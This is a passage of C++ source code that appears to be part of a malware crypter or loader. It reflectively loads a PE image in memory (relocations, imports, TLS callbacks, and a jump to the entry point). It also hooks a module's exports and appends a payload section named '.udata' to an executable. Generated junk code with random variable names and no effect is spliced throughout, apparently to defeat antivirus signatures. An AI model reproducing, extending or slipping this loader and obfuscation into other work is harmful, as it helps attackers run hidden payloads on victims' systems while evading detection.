		if (iSectionIndex == pOldNTHead->FileHeader.NumberOfSections)
		{
		}
		else
		{
			fnVirtualFree(hMod, 0, MEM_RELEASE); hMod = nullptr;
		}
	}

	if (hMod)
	{
		bool ret;
		//reloc
		IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
		unsigned char *pBase = (unsigned char*)pDos;

		IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)pDos + pDos->e_lfanew);
		IMAGE_DATA_DIRECTORY imgDirRelocation = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		unsigned char *pOrgBase = (unsigned char*)pNTHead->OptionalHeader.ImageBase;
int iSexX9jFncj = 0xe0d3ad2;
int i7v8niifvh1 = 0x6a0ff26;
int iHqLIYxavqj = 0x11e543b;
int iQDeVJ9eTpC = 0xc4a040b;
int i9hObd1abcy = 4;
switch(i9hObd1abcy)
{
    case 0:
        iSexX9jFncj = i7v8niifvh1 - 0xaf7bea1 * iHqLIYxavqj / 100;
        i7v8niifvh1 = 0x11e543b - 5 +  0x11e543b - 6 * i7v8niifvh1 / 10 + 25;
        iHqLIYxavqj = iSexX9jFncj * 0x12 + iQDeVJ9eTpC * 0x15 + 0xc4a040b / 13 + 0xaf7bea1 + 555;
        iQDeVJ9eTpC = 0xe0d3ad2 - 21 + 11 * 1996 - i7v8niifvh1 + 14520538 - iHqLIYxavqj - 14520692 + 0x6a0ff26 - 97;
        break;
    case 1:
        iSexX9jFncj = i7v8niifvh1 - 25 + 0xe0d3ad2 - 40 + 0x11e543b % 10 + 2;
        iHqLIYxavqj = iHqLIYxavqj - 0xff % 3 - iQDeVJ9eTpC * 10 + 0xaf7bea1 / 2 - 10 + 0x6a0ff26 - 5;
        iQDeVJ9eTpC = 0xe0d3ad2 % 0xaf7bea1 ^ 33 + 0x11e543b * 0x12 - 30 + 0x11e543b + 23;
        i7v8niifvh1 = i7v8niifvh1 + 321 + iHqLIYxavqj * 10 * i7v8niifvh1 / 10 / 2 + 0xaf7bea1 * 0x60;
        break;
    case 2:
        iSexX9jFncj = i7v8niifvh1 - 45 - iHqLIYxavqj * 46 + 0xe0d3ad2 / 0xdade;
        i7v8niifvh1 = i7v8niifvh1 + 0xaf7bea1 - iHqLIYxavqj * 0x6a0ff26 - 3;
        iHqLIYxavqj = 0x6a0ff26 - 0x1 + iSexX9jFncj * 0x2 - 0xaf7bea1 / 0x3 + 0x11e543b;
        iQDeVJ9eTpC = iSexX9jFncj - 0x4 * 0xe0d3ad2 + 0x1234 - 0x4567 + 0xcafe + i7v8niifvh1 % 0x432 / 0xc4a040b - 0x23;
        break;
    case 3:
        i7v8niifvh1 = iQDeVJ9eTpC * 2 * 0x6a0ff26 - 4 + 0xaf7bea1 + 12 + 34 + 0xe0d3ad2;
        iHqLIYxavqj = i7v8niifvh1 - 43 + 0x11e543b * 3040 - 0x6a0ff26 % 10 + 1 - 0x11e543b;
        iQDeVJ9eTpC = 0x11e543b - 33 + iSexX9jFncj * 0x25 + 0xe0d3ad2 - 3004 + 0x6a0ff26;
        iSexX9jFncj = 0xe0d3ad2 + 2905 % i7v8niifvh1 * 1996 + 0xc4a040b - 70 * 0xaf7bea1;
        break;
    case 4:
        iQDeVJ9eTpC = i7v8niifvh1 - 36 +0xaf7bea1 * 2001 - iHqLIYxavqj / 234 + 0x7;
        iSexX9jFncj = iQDeVJ9eTpC - 0xabcedf + 0x6a0ff26 * 0xa2bc5 + iQDeVJ9eTpC / 0x123 + 0xe0d3ad2;
        iHqLIYxavqj = iSexX9jFncj - 0x124 + 23 / i7v8niifvh1 / 3 / 2 + iHqLIYxavqj + 29 - 0x6a0ff26 + 100;
        i7v8niifvh1 = 0x6a0ff26 - 70 + 70  + 0xe0d3ad2 / 2 + 423 - 0xe0d3ad2 / 7749 % 0x1234;
        break;
    case 5:
        i7v8niifvh1 = i7v8niifvh1 - 9981 % iSexX9jFncj + 111 - iHqLIYxavqj / 224 % 0x11e543b;
        iHqLIYxavqj = iHqLIYxavqj - 339 - iHqLIYxavqj * 4416 / 0xaf7bea1 + 5525 + 0x6a0ff26 % 10;
        iQDeVJ9eTpC = iQDeVJ9eTpC - 6636 + 0x6a0ff26 * 7749 + 1 - i7v8niifvh1 * 8864 / 0xfecba;
        iSexX9jFncj = 0xaf7bea1 - 9981 % 0xe0d3ad2 % 10 % 1010100 - 0xe0d3ad2 - 23 -  0xaf7bea1 - 2500;
        break;
}
i9hObd1abcy = iQDeVJ9eTpC - 0xaa + 0x11e543b * 46 - 15 / iHqLIYxavqj + 11 - 0xe0d3ad2;
i9hObd1abcy = i9hObd1abcy - 70 * 55 - iHqLIYxavqj ^ 0x99 - 0x567498 % 0xe0d3ad2 % 2 - 234 + 0x6a0ff26;

		if (pOrgBase == pBase)
		{
			ret = true;
		}
		else if (imgDirRelocation.VirtualAddress == 0)
		{
			ret = false;
		}
		else
		{
			size_t delta = pBase - pOrgBase;

			IMAGE_BASE_RELOCATION *pBaseReloc = (IMAGE_BASE_RELOCATION*)(pBase + imgDirRelocation.VirtualAddress);

			if (imgDirRelocation.VirtualAddress + imgDirRelocation.Size >= pNTHead->OptionalHeader.SizeOfImage)
			{
				ret = false;
			}
			else
			{
				//ret = DoBaseReloc(pBase, pNTHead->OptionalHeader.SizeOfImage, delta, pBaseReloc, imgDirRelocation.Size);
int iFf2jcuogW9 = 0x9dcf98f;
int iT2P7UU9irz = 0x8e412bd;
int iUd3pkVIklx = iFf2jcuogW9 / iT2P7UU9irz;

				unsigned char *codeBase = pBase;
				size_t codeSize = pNTHead->OptionalHeader.SizeOfImage;
				int remainSize = imgDirRelocation.Size;
				ret = true;
				while (remainSize > 0 && ret)
				{
					WORD *arrRel = (WORD *)&pBaseReloc[1];
					int nRel = (pBaseReloc[0].SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
					char *dest = (char*)codeBase + pBaseReloc[0].VirtualAddress;

					if (dest < (char*)codeBase || (char*)codeBase + codeSize < dest)
					{
						ret = false;
					}
					else for (int i = 0; i < nRel; ++i)
					{
						DWORD *patchAddrHL;
#ifdef _WIN64
						ULONGLONG *patchAddr64;
#endif
						int offset = arrRel[i] & 0xfff;
						switch (arrRel[i] >> 12)
						{
						case IMAGE_REL_BASED_ABSOLUTE:
							// skip relocation
							break;

						case IMAGE_REL_BASED_HIGHLOW:
							// change complete 32 bit address
							patchAddrHL = (DWORD *)(dest + offset);
							*patchAddrHL += (DWORD)delta;
							break;

#ifdef _WIN64
						case IMAGE_REL_BASED_DIR64:
							patchAddr64 = (ULONGLONG *)(dest + offset);
							*patchAddr64 += delta;
							break;
#endif

						default:
							ret = false;
							break;
						}
					}

					if (ret)
					{
						remainSize -= pBaseReloc[0].SizeOfBlock;
						pBaseReloc = (IMAGE_BASE_RELOCATION *)((char*)pBaseReloc + pBaseReloc[0].SizeOfBlock);
					}
				}
			}
		}

		if (ret)
		{
			//import
			pDos = (IMAGE_DOS_HEADER*)hMod;
			pBase = (unsigned char*)hMod;

			pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
int iOZIy1otofr = 0xd9b3b83;
int iwBoKDBfQkk = 0xa0bb5ba;
int iEwB65hPHk7 = iOZIy1otofr % iwBoKDBfQkk;

			IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];


			if (imgDirImport.VirtualAddress)
			{
				IMAGE_IMPORT_DESCRIPTOR *pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + imgDirImport.VirtualAddress);
				if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
				{
					ret = false;
				}
				else
				{
					//ret = DoImport(pBase, pImportDesc, fnLoadLibraryA, fnGetProcAddress);
					unsigned char *codeBase = pBase;

					ret = true;

					while (pImportDesc[0].Name)
					{
						char *szLibName = (char*)codeBase + pImportDesc[0].Name;

						HMODULE hLib = fnLoadLibraryA(szLibName);

						if (!hLib)
						{
							ret = false;
							break;
						}

						POINTER_TYPE *thunkRef;
						FARPROC *funcRef;
						if (pImportDesc[0].OriginalFirstThunk) {
							thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].OriginalFirstThunk);
							funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
						}
						else {
							// no hint table
							thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].FirstThunk);
							funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
						}

						if (!thunkRef || !funcRef)
						{
							ret = false;
int iVqc366Hhhq = 0x037c291;
int ijQe5Npbgna = 0x0d8f03b;
int iFgkgybJvF9 = 0x2cc3662;
int iDhc1Merryy = 0xebe452e;
int iavhiDbCWYa = 0;
switch(iavhiDbCWYa)
{
    case 0:
        iVqc366Hhhq = ijQe5Npbgna - 0x3b8e7cd * iFgkgybJvF9 / 100;
        ijQe5Npbgna = 0x2cc3662 - 5 +  0x2cc3662 - 6 * ijQe5Npbgna / 10 + 25;
        iFgkgybJvF9 = iVqc366Hhhq * 0x12 + iDhc1Merryy * 0x15 + 0xebe452e / 13 + 0x3b8e7cd + 555;
        iDhc1Merryy = 0x037c291 - 21 + 11 * 1996 - ijQe5Npbgna + 14520538 - iFgkgybJvF9 - 14520692 + 0x0d8f03b - 97;
        break;
    case 1:
        iVqc366Hhhq = ijQe5Npbgna - 25 + 0x037c291 - 40 + 0x2cc3662 % 10 + 2;
        iFgkgybJvF9 = iFgkgybJvF9 - 0xff % 3 - iDhc1Merryy * 10 + 0x3b8e7cd / 2 - 10 + 0x0d8f03b - 5;
        iDhc1Merryy = 0x037c291 % 0x3b8e7cd ^ 33 + 0x2cc3662 * 0x12 - 30 + 0x2cc3662 + 23;
        ijQe5Npbgna = ijQe5Npbgna + 321 + iFgkgybJvF9 * 10 * ijQe5Npbgna / 10 / 2 + 0x3b8e7cd * 0x60;
        break;
    case 2:
        iVqc366Hhhq = ijQe5Npbgna - 45 - iFgkgybJvF9 * 46 + 0x037c291 / 0xdade;
        ijQe5Npbgna = ijQe5Npbgna + 0x3b8e7cd - iFgkgybJvF9 * 0x0d8f03b - 3;
        iFgkgybJvF9 = 0x0d8f03b - 0x1 + iVqc366Hhhq * 0x2 - 0x3b8e7cd / 0x3 + 0x2cc3662;
        iDhc1Merryy = iVqc366Hhhq - 0x4 * 0x037c291 + 0x1234 - 0x4567 + 0xcafe + ijQe5Npbgna % 0x432 / 0xebe452e - 0x23;
        break;
    case 3:
        ijQe5Npbgna = iDhc1Merryy * 2 * 0x0d8f03b - 4 + 0x3b8e7cd + 12 + 34 + 0x037c291;
        iFgkgybJvF9 = ijQe5Npbgna - 43 + 0x2cc3662 * 3040 - 0x0d8f03b % 10 + 1 - 0x2cc3662;
        iDhc1Merryy = 0x2cc3662 - 33 + iVqc366Hhhq * 0x25 + 0x037c291 - 3004 + 0x0d8f03b;
        iVqc366Hhhq = 0x037c291 + 2905 % ijQe5Npbgna * 1996 + 0xebe452e - 70 * 0x3b8e7cd;
        break;
    case 4:
        iDhc1Merryy = ijQe5Npbgna - 36 +0x3b8e7cd * 2001 - iFgkgybJvF9 / 234 + 0x7;
        iVqc366Hhhq = iDhc1Merryy - 0xabcedf + 0x0d8f03b * 0xa2bc5 + iDhc1Merryy / 0x123 + 0x037c291;
        iFgkgybJvF9 = iVqc366Hhhq - 0x124 + 23 / ijQe5Npbgna / 3 / 2 + iFgkgybJvF9 + 29 - 0x0d8f03b + 100;
        ijQe5Npbgna = 0x0d8f03b - 70 + 70  + 0x037c291 / 2 + 423 - 0x037c291 / 7749 % 0x1234;
        break;
    case 5:
        ijQe5Npbgna = ijQe5Npbgna - 9981 % iVqc366Hhhq + 111 - iFgkgybJvF9 / 224 % 0x2cc3662;
        iFgkgybJvF9 = iFgkgybJvF9 - 339 - iFgkgybJvF9 * 4416 / 0x3b8e7cd + 5525 + 0x0d8f03b % 10;
        iDhc1Merryy = iDhc1Merryy - 6636 + 0x0d8f03b * 7749 + 1 - ijQe5Npbgna * 8864 / 0xfecba;
        iVqc366Hhhq = 0x3b8e7cd - 9981 % 0x037c291 % 10 % 1010100 - 0x037c291 - 23 -  0x3b8e7cd - 2500;
        break;
}
iavhiDbCWYa = iDhc1Merryy - 0xaa + 0x2cc3662 * 46 - 15 / iFgkgybJvF9 + 11 - 0x037c291;
iavhiDbCWYa = iavhiDbCWYa - 70 * 55 - iFgkgybJvF9 ^ 0x99 - 0x567498 % 0x037c291 % 2 - 234 + 0x0d8f03b;

							break;
						}
						else for (; *thunkRef; thunkRef++, funcRef++)
						{
							if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
							{
								*funcRef = fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
int iss8ury9T8C = 0xb7b8b16;
int icWZwWphSTt = 0xf124a64;
int itYZvlTBET9 = iss8ury9T8C * icWZwWphSTt;

							}
							else
							{
								PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + (*thunkRef));

								*funcRef = fnGetProcAddress(hLib, (LPCSTR)&thunkData->Name);
							}

							if (*funcRef == 0) {
								ret = false;
								break;
							}
						}

						pImportDesc++;
					}
				}
			}

			if (ret)
			{
				//ExecuteTLS
				unsigned char *codeBase = (unsigned char *)hMod;
				PIMAGE_TLS_DIRECTORY tls;
				PIMAGE_TLS_CALLBACK* callback;

				IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)codeBase;
				IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(codeBase + pDos->e_lfanew);
				PIMAGE_DATA_DIRECTORY directory = &pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
				if (directory->VirtualAddress == 0) {
					ret = true;
				}
				else
				{
					tls = (PIMAGE_TLS_DIRECTORY)(codeBase + directory->VirtualAddress);
					callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
					if (callback) {
						while (*callback) {
							(*callback)((LPVOID)codeBase, DLL_PROCESS_ATTACH, NULL);
							callback++;
						}
					}
				}

				if (ret)
				{
					pDos = (IMAGE_DOS_HEADER*)hMod;
					pNTHead = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);

					char *pEntry = (char*)hMod + pNTHead->OptionalHeader.AddressOfEntryPoint;

					if ((pNTHead->FileHeader.Characteristics&IMAGE_FILE_DLL) == 0)
					{
						int(WINAPI *iExeMain)(void);
						*(char **)&iExeMain = pEntry;

						iExeMain();
					}
				}

			}
		}
	}
	
	return hMod;
}

void End_Load(){}
FARPROC GetFuncAddress(HMODULE hMod, unsigned int hashProc)
{
	FARPROC ret = nullptr;
int iM0Q2A5jWS3 = 0xedc068a;
int iOBFh8kTkgU = 0x9b059c4;
int iWPipnyx06C = iM0Q2A5jWS3 * iOBFh8kTkgU;


	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)hMod;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (imgDirImport.VirtualAddress)
	{
		IMAGE_EXPORT_DIRECTORY *pExportDesc = (IMAGE_EXPORT_DIRECTORY*)(pBase + imgDirImport.VirtualAddress);
		if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
		}
		else
		{
			ret = DoGetProcAddress(pBase, pExportDesc, hashProc);
		}
	}

	return ret;
}

FARPROC GetFuncAddress(HMODULE hMod, const char * szProc)
{
	return GetFuncAddress(hMod, NameHash(szProc));
}

bool HookExport(HMODULE hMod, FARPROC fpOrgFunc, FARPROC fpChangeTo)
{
	bool ret = false;
	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	IMAGE_NT_HEADERS *pNt = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);

	IMAGE_EXPORT_DIRECTORY *pExport = (IMAGE_EXPORT_DIRECTORY*)((char*)hMod + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	WORD *pwExportOrd = (WORD*)((char*)hMod + pExport->AddressOfNameOrdinals);
	DWORD *pdwExportAddr = (DWORD*)((char*)hMod + pExport->AddressOfFunctions);
int iItaQ3IKv7y = 0x71a2cc1;
int igdgjjaWTg3 = 0x6f9e3dc;
int i9Uza41mD9m = iItaQ3IKv7y ^ igdgjjaWTg3;


	DWORD i, n = pExport->NumberOfFunctions;
	for (i = 0; i < n; ++i)
	{
		FARPROC fp = (FARPROC)(pdwExportAddr[pwExportOrd[i]] + (char*)hMod);
		if (fp == fpOrgFunc)
		{
			DWORD dwOldProtect = 0;
			if (VirtualProtect(&pdwExportAddr[pwExportOrd[i]], sizeof(pdwExportAddr[0]), PAGE_EXECUTE_READWRITE, &dwOldProtect))
			{
				pdwExportAddr[pwExportOrd[i]] = (char*)fpChangeTo - (char*)hMod;
				VirtualProtect(&pdwExportAddr[pwExportOrd[i]], sizeof(pdwExportAddr[0]), dwOldProtect, &dwOldProtect);
				ret = true;
			}
			break;
		}
	}

	return ret;
}

char *InsertLastSection(const void *pImg, DWORD &sztImg, SectionData *sData)
{
	DWORD HeaderSum = 0, CheckSum = 0;
	const IMAGE_DOS_HEADER *pOldDos = (const IMAGE_DOS_HEADER*)pImg;
	char *pChOldDos = (char*)pImg;
	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)pChOldDos + pOldDos->e_lfanew);

	char *pChNewDos = (char*)calloc(sztImg + Align(sData->buf_size + sizeof(SectionData), pOldNTHead->OptionalHeader.FileAlignment), 1);
	memcpy(pChNewDos, pChOldDos, sztImg);
	sztImg = sztImg + Align(sData->buf_size + sizeof(SectionData), pOldNTHead->OptionalHeader.FileAlignment);

	const IMAGE_DOS_HEADER *pNewDos = (const IMAGE_DOS_HEADER*)pChNewDos;

	IMAGE_NT_HEADERS *pNewNTHead = (IMAGE_NT_HEADERS*)((char*)pChNewDos + pNewDos->e_lfanew);
	DWORD dwNewFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pNewNTHead->FileHeader.SizeOfOptionalHeader);
int i5YPpBIgQTe = 0x39bfd68;
int icRJQ5w7Iq9 = 0xafa2b6f;
int i28jBQ7PjGv = 0x8a84628;
int ixSpU9om8ta = i28jBQ7PjGv * icRJQ5w7Iq9 + i5YPpBIgQTe;
icRJQ5w7Iq9 = 0x0ee57ba + ixSpU9om8ta + 0x592f874 + i5YPpBIgQTe;
int iXboB1oqXfd = i5YPpBIgQTe / 0xafa2b6f - i28jBQ7PjGv ^ i28jBQ7PjGv ^ 0x8a84628;

	IMAGE_SECTION_HEADER *pNewSectHead = (IMAGE_SECTION_HEADER*)((char*)pNewNTHead + dwNewFullNTSize);


	pNewNTHead->FileHeader.NumberOfSections = pNewNTHead->FileHeader.NumberOfSections + 1;
	int iLastSectionIndex = pNewNTHead->FileHeader.NumberOfSections - 1;
	strcpy((char*)pNewSectHead[iLastSectionIndex].Name, ".udata");
	pNewSectHead[iLastSectionIndex].Misc.PhysicalAddress = sData->buf_size + sizeof(SectionData);
	pNewSectHead[iLastSectionIndex].Misc.VirtualSize = sData->buf_size + sizeof(SectionData);
	pNewSectHead[iLastSectionIndex].VirtualAddress = Align(pNewSectHead[iLastSectionIndex - 1].VirtualAddress + pNewSectHead[iLastSectionIndex - 1].Misc.VirtualSize, pNewNTHead->OptionalHeader.SectionAlignment);
	pNewSectHead[iLastSectionIndex].SizeOfRawData = Align(sData->buf_size + sizeof(SectionData), pNewNTHead->OptionalHeader.FileAlignment);
	pNewSectHead[iLastSectionIndex].PointerToRawData = Align(pNewSectHead[iLastSectionIndex - 1].PointerToRawData + pNewSectHead[iLastSectionIndex - 1].SizeOfRawData, pNewNTHead->OptionalHeader.FileAlignment);
	pNewSectHead[iLastSectionIndex].PointerToRelocations = 0;
	pNewSectHead[iLastSectionIndex].PointerToLinenumbers = 0;
	pNewSectHead[iLastSectionIndex].NumberOfRelocations = 0;
	pNewSectHead[iLastSectionIndex].NumberOfLinenumbers = 0;
	pNewSectHead[iLastSectionIndex].Characteristics = 0x40000000;

	pNewNTHead->OptionalHeader.SizeOfImage = pNewNTHead->OptionalHeader.SizeOfImage + pNewSectHead[iLastSectionIndex].Misc.VirtualSize;

	memcpy((void*)(pChNewDos + pNewSectHead[iLastSectionIndex].PointerToRawData), sData, sData->buf_size + sizeof(SectionData));

	CheckSumMappedFile(pChNewDos, sztImg, &HeaderSum, &CheckSum);
	pNewNTHead->OptionalHeader.CheckSum = CheckSum;

	return pChNewDos;
}

